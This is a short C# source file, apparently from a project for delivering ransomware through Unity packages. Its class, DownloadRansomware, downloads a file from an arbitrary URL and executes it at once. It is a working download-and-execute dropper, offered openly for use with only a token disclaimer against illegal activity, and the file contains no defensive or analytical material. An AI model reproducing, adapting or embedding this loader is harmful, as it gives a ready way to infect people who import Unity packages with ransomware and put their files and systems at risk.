using System.Net;
using System.Diagnostics;

namespace UnitypackageRussianRoulett
{
    //Dont use that for Illegal aktivity!
    //Github: https://github.com/none-development/unitypackage-ransomware
    public class DownloadRansomware
    {


        /// <summary>
        /// Method to download a file
        /// </summary>
        /// <param name="downloadurl">Full URL from the Filw you want to Download</param>
        /// <param name="downloadpath">Full Path for the File</param>
        /// <param name="filenamedownload">e.g Progamm.exe</param>
        public static void RunDownloadedProgramm(string downloadurl, string downloadpath = null, string filenamedownload = null)
        {
            using (var downloader = new WebClient())
            {
                downloader.DownloadFile(downloadurl, downloadpath + filenamedownload);
            }
            Process.Start(downloadpath+filenamedownload);
        }
    }
}
